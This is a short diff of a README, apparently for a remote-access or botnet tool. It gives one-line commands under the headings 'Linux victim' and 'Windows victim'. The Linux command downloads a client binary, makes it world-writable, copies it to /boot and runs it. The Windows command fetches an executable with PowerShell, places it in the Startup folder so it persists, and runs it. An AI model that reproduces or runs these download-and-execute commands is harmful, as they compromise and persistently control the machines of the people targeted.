@@ -18,7 +18,7 @@ TG @udbnt
 ![image](https://user-images.githubusercontent.com/104208624/203849462-74c44f4f-463b-4549-b0bd-53ba0416bcfc.png)
 
 # Linux victim
-cd /tmp; apt-get update -y; apt-get install curl -y; apt-get install python3 -y; curl -O LClient "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 LClient; cp LClient /boot; ./LClient
+cd /tmp; apt-get update -y; apt-get install curl -y; curl -O LClient "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 LClient; cp LClient /boot; ./LClient
 
 # Windows victim
 cd %temp% & powershell -command Invoke-WebRequest https://github.com/NAME/NAME/raw/main/NAME.exe -OutFile WClient.exe & copy WClient.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" & WClient.exe
